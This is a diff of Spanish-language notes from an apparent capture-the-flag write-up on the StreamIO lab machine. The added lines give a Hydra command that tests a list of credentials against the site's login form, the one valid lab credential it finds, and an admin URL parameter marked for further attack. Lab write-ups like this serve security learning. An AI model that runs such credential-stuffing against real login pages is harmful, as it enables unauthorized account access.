@@ -230,5 +230,19 @@ yoshihide::66boysandgirls..
 ```
 
 Consiguiendo acceder con el usuario
-Vamos a probar copn los demas usuarios usando [[HYDRA]]
+Vamos a probar con los demás usuarios usando [[HYDRA]]
+```shell
+hydra -C validcredentials.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
+```
 
+Solo nos muestra como valida
+```ad-hint
+yoshihide::66boysandgirls..
+```
+
+
+Con este usuario ahora podemos acceder a `/admin` ya que es un usuario logeado y ademas es usuario administrador en la web
+ Al navegar por los recursos nos encontramos este tipo de peticionen la URL
+ ```shell
+ https://streamio.htb/admin/?staff=
+ ```
